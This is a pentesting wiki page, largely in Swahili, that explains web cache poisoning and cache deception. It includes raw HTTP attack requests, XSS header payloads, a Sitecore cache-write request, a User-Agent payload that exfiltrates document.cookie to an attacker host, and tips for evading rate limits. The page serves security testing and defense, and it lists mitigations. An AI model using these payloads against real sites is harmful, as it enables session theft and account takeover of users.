# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## The difference

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, mshambuliaji husababisha programu kuhifadhi baadhi ya maudhui hatarishi katika cache, na maudhui haya hutolewa kutoka cache kwa watumiaji wengine wa programu.
> - In **web cache deception**, mshambuliaji husababisha programu kuhifadhi maudhui nyeti ya mtumiaji mwingine katika cache, kisha mshambuliaji hurudisha maudhui haya kutoka kwenye cache.

## Cache Poisoning

Cache poisoning inalenga kuingilia cache ya upande wa mteja ili kumlazimisha mteja kupakia rasilimali zisizotarajiwa, zisizokamilika, au zilizo chini ya udhibiti wa mshambuliaji. Ukubwa wa athari unategemea maarufu ya ukurasa uliokumba, kwani majibu yaliyochafu hutolewa kwa watumiaji wanaotembelea ukurasa wakati wa kipindi cha uchafu wa cache pekee.

Utekelezaji wa shambulio la cache poisoning unahusisha hatua kadhaa:

1. **Kuainisha vigezo visivyotumika kama key**: Hii ni vigezo ambavyo, ingawa havihitajiki kwa ombi kuhifadhiwa kwenye cache, vinaweza kubadilisha majibu yanayotolewa na server. Kuainisha vigezo hivi ni muhimu kwa sababu vinaweza kutumiwa kuathiri cache.
2. **Kutumia vigezo visivyo na key**: Baada ya kuainisha vigezo visivyo na key, hatua inayofuata ni kubaini jinsi ya kutumia vibaya vigezo hivi ili kubadilisha majibu ya server kwa njia inayomfaa mshambuliaji.
3. **Kuhakikisha Majibu yaliyochafu yamehifadhiwa kwenye cache**: Hatua ya mwisho ni kuhakikisha kuwa majibu yaliyobadilishwa yamehifadhiwa kwenye cache. Kwa njia hiyo, mtumiaji yeyote anayeingia ukurasa uliokumba wakati cache imechafuka atapokea jibu lililochafuka.

### Discovery: Check HTTP headers

Kawaida, wakati jibu lilihifadhiwa kwenye cache kutakuwa na kichwa kinachoonyesha hivyo; unaweza kuangalia ni vichwa gani vinavyostahili kuzingatiwa katika chapisho hili: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

Iwapo unafikiri jibu linawekwa kwenye cache, unaweza kujaribu kutuma maombi yenye header mbaya, ambayo yanapaswa kurejelewa na status code 400. Kisha jaribu kufikia ombi kawaida na ikiwa jibu ni status code 400, unajua ni vunja (na hata unaweza kutekeleza DoS).

You can find more options in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Hata hivyo, kumbuka kwamba wakati mwingine aina hizi za status codes hazihifadhiwi kwenye cache, kwa hivyo jaribio hili halina uhakika.

### Discovery: Identify and evaluate unkeyed inputs

Unaweza kutumia [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) kufanyia brute-force parameters na headers ambazo zinaweza kubadilisha jibu la ukurasa. Kwa mfano, ukurasa unaweza kutumia header `X-Forwarded-For` kuonyesha mteja kupakia script kutoka huko:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Sababisha jibu hatari kutoka kwa back-end server

Ukibaini parameter/header, angalia jinsi inavyosafishwa na wapi inarejea au inavyoathiri response kutoka kwa header. Je, unaweza kuitumia vibaya (perform an XSS au load JS unayodhibiti? perform DoS?...)

### Pata response ikahifadhiwa kwenye cache

Mara baada ya kuwa umeya **baini** **page** inayoweza kutumika vibaya, ni **parameter**/**header** gani ya kutumia na **jinsi** ya kuiabusa, unahitaji kuhakikisha ukurasa umehifadhiwa kwenye cache. Kulingana na rasilimali unayotaka kuweka kwenye cache, inaweza kuchukua muda; huenda ukahitaji kujaribu kwa sekunde kadhaa.

Header **`X-Cache`** katika response inaweza kuwa muhimu kwani inaweza kuwa na thamani **`miss`** wakati request haikuwekwa kwenye cache na thamani **`hit`** wakati imehifadhiwa.\
Header **`Cache-Control`** pia ni muhimu kujua ikiwa rasilimali inawekwa kwenye cache na ni lini itahifadhiwa tena: `Cache-Control: public, max-age=1800`

Header nyingine ya kuvutia ni **`Vary`**. Header hii mara nyingi hutumika kuonyesha **headers za ziada** zinazochukuliwa kama **sehemu ya cache key** hata kama kawaida hazizingatiiwi kama key. Kwa hivyo, ikiwa mshambuliaji anajua `User-Agent` ya mwathiriwa anayemlenga, anaweza poison the cache kwa watumiaji wanaotumia `User-Agent` hiyo.

Header nyingine inayohusiana na cache ni **`Age`**. Inabainisha muda kwa sekunde ambao kitu kimekuwa katika proxy cache.

Unapohifadhi request kwenye cache, kuwa **makini na headers unazotumia** kwa sababu baadhi yao yanaweza **kutumika bila kutarajiwa** kama **keyed** na **mwathiriwa atahitaji kutumia header hiyo hiyo**. Daima **jaribu** Cache Poisoning kwa **browsers tofauti** ili uhakikishe inafanya kazi.

## Mifano ya Exploiting

### Mfano rahisi zaidi

Header kama `X-Forwarded-For` inarejea kwenye response bila kusafishwa.\
Unaweza kutuma payload ya msingi ya XSS na poison the cache ili kila mtu anayefungua ukurasa apate XSS:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Kumbuka kwamba hii itapoison ombi kwa `/en?region=uk` si kwa `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

Katika **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** inaelezea tukio rahisi lifuatalo:

- CDN itakayocache chochote chini ya `/share/`
- CDN haitadecode wala haitanormalize `%2F..%2F`, kwa hivyo inaweza kutumika kama **path traversal to access other sensitive locations that will be cached** kama `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Server ya wavuti WILL decode and normalize `%2F..%2F`, na itajibu na `/api/auth/session`, ambayo **ina auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies pia zinaweza kuonekana katika response ya ukurasa. Ikiwa unaweza kuabuse hilo kusababisha XSS, kwa mfano, unaweza ku-exploit XSS katika clients kadhaa zinazopakia malicious cache response.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Kumbuka kwamba ikiwa cookie iliyo hatarini inatumiwa mara kwa mara na watumiaji, maombi ya kawaida yataosha cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Angalia:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) jinsi ilivyowezekana kuiba OpenAI API key kwa URL kama `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` kwa sababu chochote kinacholingana na `/share/*` kitabebwa bila Cloudflare normalising the URL, ambayo ilifanywa wakati ombi lilipofika kwenye web server.

Hii pia imeelezewa vyema katika:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Wakati mwingine utahitaji **exploit several unkeyed inputs** ili uweze abuse cache. Kwa mfano, unaweza kupata an **Open redirect** ikiwa utaweka `X-Forwarded-Host` kwa domain unayodhibiti na `X-Forwarded-Scheme` kuwa `http`. Ikiwa **server** inafanya **forwarding** maombi yote ya **HTTP** **to HTTPS** na inatumia header `X-Forwarded-Scheme` kama jina la domain kwa redirect, unaweza kudhibiti wapi ukurasa unaelekezwa na redirect.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Kutumia `Vary`header iliyopunguzwa

Ikiwa umegundua kwamba **`X-Host`** header inatumika kama **jina la domaini kupakia rasilimali ya JS** lakini header ya **`Vary`** katika jibu inaonyesha **`User-Agent`**. Kisha, unahitaji kupata njia ya exfiltrate `User-Agent` ya mwanaathirika na poison the cache ukitumia `User-Agent` huo:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Tuma GET request yenye request katika URL na katika body. Ikiwa web server inatumia ile kutoka body lakini cache server inahifadhi ile kutoka URL, yeyote anayefikia URL hiyo atatumia parameter kutoka body. Kama vile vuln James Kettle alipogundua kwenye Github website:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Kuna labu ya PortSwigger kuhusu hili: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

For example it's possible to separate **parameters** in ruby servers using the char **`;`** instead of **`&`**. This could be used to put unkeyed parameters values inside keyed ones and abuse them.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Jifunze hapa kuhusu jinsi ya kufanya [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Upimaji wa otomatiki kwa Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) inaweza kutumiwa kupima otomatiki kwa web cache poisoning. Inasaidia mbinu nyingi tofauti na inaweza kubinafsishwa kwa kiasi kikubwa.

Mfano wa matumizi: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Mfano huu wa ulimwengu halisi unaunganisha primitive ya header-based reflection na tabia ya CDN/WAF ili kwa kuaminika ku-poison HTML iliyohifadhiwa (cached) inayotumiwa kwa watumiaji wengine:

- HTML kuu iliakisi header ya request isiyoaminika (kwa mfano, `User-Agent`) ndani ya executable context.
- CDN iliondoa cache headers lakini kulikuwepo cache ya internal/origin. CDN pia ili-auto-cache requests zinazomalizika kwa extensions za static (kwa mfano, `.js`), wakati WAF ilitumia ukaguzi mdogo wa maudhui kwa GETs za static assets.
- Mabadiliko ya mtiririko wa requests yaliwezesha request kwa njia ya `.js` kuathiri cache key/variant iliyotumika kwa HTML kuu iliyofuata, hivyo kuwezesha cross-user XSS kupitia header reflection.

Mapishi ya vitendo (iliyoshuhudiwa kwenye CDN/WAF maarufu):

1) Kutoka IP safi (epuka prior reputation-based downgrades), weka `User-Agent` yenye uhasama kupitia browser au Burp Proxy Match & Replace.  
2) Katika Burp Repeater, andaa kundi la requests mbili na tumia "Send group in parallel" (single-packet mode works best):
- Request ya kwanza: GET njia ya rasilimali ya `.js` kwenye origin ileile huku ukituma `User-Agent` yako yenye uhasama.
- Mara moja baada yake: GET ukurasa mkuu (`/`).
3) Mbio za routing za CDN/WAF pamoja na `.js` iliyohifadhiwa kwa otomatiki mara nyingi huzaa variant ya HTML iliyopoisona katika cache ambayo kisha hutumika kwa wageni wengine wanaoshiriki masharti yale yale ya cache key (kwa mfano, same `Vary` dimensions like `User-Agent`).

Mfano wa header payload (to exfiltrate non-HttpOnly cookies):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- CDNs nyingi huficha cache headers; poisoning inaweza kuonekana tu kwenye mizunguko ya refresh ya masaa mengi. Tumia multiple vantage IPs na throttle ili kuepuka rate-limit au reputation triggers.
- Kutumia IP kutoka cloud ya CDN mwenyewe wakati mwingine huboresha routing consistency.
- Ikiwa kuna CSP kali, bado inafanya kazi ikiwa reflection inaendeshwa katika main HTML context na CSP inaruhusu inline execution au inapitiwa na context.

Impact:

- Ikiwa session cookies si `HttpOnly`, zero-click ATO inawezekana kwa mass-exfiltrating `document.cookie` kutoka kwa watumiaji wote wanaopokelewa poisoned HTML.

Defenses:

- Acha ku-reflect request headers ndani ya HTML; context-encode kwa ukali ikiwa haiwezi kuepukika. Linganisha sera za cache za CDN na origin na epuka ku-vary kwa headers zisizoaminika.
- Hakikisha WAF inatumia content inspection kwa uthabiti kwa `.js` requests na static paths.
- Weka `HttpOnly` (na `Secure`, `SameSite`) kwenye session cookies.

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

Mfumo maalum wa Sitecore huruhusu uandishi usioidhinishwa kwenye HtmlCache kwa kutumia vibaya pre‑auth XAML handlers na AjaxScriptManager reflection. Wakati handler ya `Sitecore.Shell.Xaml.WebControl` inafikiwa, `xmlcontrol:GlobalHeader` (iliyotokana na `Sitecore.Web.UI.WebControl`) inapatikana na wito wa reflective ufuatao unaruhusiwa:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Hii inaandika HTML yoyote chini ya cache key iliyochaguliwa na mshambuliaji, ikiruhusu precise poisoning mara cache keys zinapojulikana.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Mifano Inayoweza Kuathiriwa

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS ilituma fragment ndani ya URL bila kuiondoa na ikatengeneza cache key ikitumia tu host, path na query (ikisingiza fragment). Hivyo ombi `/#/../?r=javascript:alert(1)` lilitumwa kwa backend kama `/#/../?r=javascript:alert(1)` na cache key haikuwa na payload ndani yake, ilikuwa na host, path na query tu.

### GitHub CP-DoS

Kutuma thamani mbaya kwenye content-type header ilisababisha response ya 405 iliyohifadhiwa (cached). Cache key ilijumuisha cookie hivyo ilikuwa inawezekana kushambulia tu unauth users.

### GitLab + GCP CP-DoS

GitLab inatumia GCP buckets kuhifadhi static content. **GCP Buckets** zinaunga mkono header **`x-http-method-override`**. Kwa hivyo ilikuwa inawezekana kutuma header `x-http-method-override: HEAD` na poison the cache ili irudishe response body tupu. Pia inaweza kusaidia method `PURGE`.

### Rack Middleware (Ruby on Rails)

Katika applications za Ruby on Rails, Rack middleware mara nyingi hutumika. Kusudi la code ya Rack ni kuchukua thamani ya header **`x-forwarded-scheme`** na kuiweka kama scheme ya request. Wakati header `x-forwarded-scheme: http` inapotumwa, hutokea redirect ya 301 kwenda eneo lile lile, jambo ambalo linaweza kusababisha Denial of Service (DoS) kwa rasilimali hiyo. Zaidi ya hayo, application inaweza kutambua header `X-forwarded-host` na kuwarudisha watumiaji kwenye host iliyotajwa. Tabia hii inaweza kusababisha kupakia kwa faili za JavaScript kutoka kwenye server ya mshambuliaji, na hivyo kuleta hatari ya usalama.

### 403 and Storage Buckets

Cloudflare hapo awali ilihakikisha (cached) majibu ya 403. Kujaribu kufikia S3 au Azure Storage Blobs kwa Authorization headers zisizo sahihi kungepelekea jibu la 403 ambalo lilihifadhiwa. Ingawa Cloudflare imeacha caching ya majibu ya 403, tabia hii inaweza bado kuwepo katika proxy services zingine.

### Injecting Keyed Parameters

Caches mara nyingi hujumuisha parameters maalum za GET kwenye cache key. Kwa mfano, Varnish ya Fastly ilihakikisha parameter ya `size` katika requests. Hata hivyo, kama toleo lililotumwa kwa URL-encoding la parameter (mfano, `siz%65`) lililetwa pia na thamani isiyo sahihi, cache key ingejengwa kwa kutumia parameter sahihi ya `size`. Hata hivyo, backend itashughulikia thamani katika parameter iliyokuwa URL-encoded. Kufanya URL-encoding kwa parameter ya pili `size` kulisababisha kutokujumuishwa kwake na cache lakini kutumika na backend. Kuipa thamani ya 0 parameter hii kulipelekea kosa la 400 Bad Request ambalo lingeweza kuhifadhiwa na cache.

### User Agent Rules

Baadhi ya developers huzuia requests zenye user-agents zinazolingana na zana za trafiki kubwa kama FFUF au Nuclei ili kudhibiti mzigo wa server. Kwa uwazi, njia hii inaweza kuleta udhaifu kama cache poisoning na DoS.

### Illegal Header Fields

[https://datatracker.ietf.mrg/doc/html/rfc7230](https://datatracker.ietf.mrg/doc/html/rfc7230) inabainisha characters zinazoruhusiwa kwenye header names. Headers zenye characters zisizo ndani ya range ya **tchar** kwa kawaida zinapaswa kusababisha jibu la 400 Bad Request. Katika utekelezaji, servers si kila wakati zinafuata standard hii. Mfano muhimu ni Akamai, ambayo inapeleka headers zenye characters zisizo halali na inahifadhi (cache) kosa lolote la 400, mradi tu header `cache-control` haipo. Muundo unaoweza kutumika ulitambuliwa ambapo kutuma header yenye character isiyokubalika, kama `\`, kungepelekea kosa la 400 Bad Request linaloweza kuhifadhiwa na cache.

### Kupata headers mpya

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

Kwanza kumbuka kwamba **extensions** kama `.css`, `.js`, `.png` n.k. kawaida huwa **configured** kuhifadhiwa katika **cache.** Kwa hivyo, ikiwa utafikia `www.example.com/profile.php/nonexistent.js` cache inaweza kuhifadhi response kwa sababu inaona `.js` **extension**. Lakini, ikiwa **application** inarudisha maudhui nyeti ya mtumiaji yaliyohifadhiwa katika _www.example.com/profile.php_, unaweza **kuiba** yale maudhui kutoka kwa watumiaji wengine.

Mambo mengine ya kujaribu:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Tumia extensions zisizojulikana kama_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Katika mfano, inafafanuliwa kuwa ikiwa unapakia ukurasa usiopo kama _http://www.example.com/home.php/non-existent.css_ yaliyomo ya _http://www.example.com/home.php_ (**yenye taarifa nyeti za mtumiaji**) yatarudishwa na server ya cache itahifadhi matokeo.\
Kisha, **attacker** anaweza kufikia _http://www.example.com/home.php/non-existent.css_ kwenye kivinjari chake na kuona **taarifa za siri** za watumiaji waliotembelea hapo awali.

Tambua kwamba **cache proxy** inapaswa kuwa **configured** kuhifadhi files **kwa msingi** wa **extension** ya file (_.css_) na siyo msingi wa content-type. Katika mfano _http://www.example.com/home.php/non-existent.css_ itakuwa na content-type `text/html` badala ya `text/css` mime type.

Jifunze hapa kuhusu jinsi ya kufanya[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Vifaa Otomatiki

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
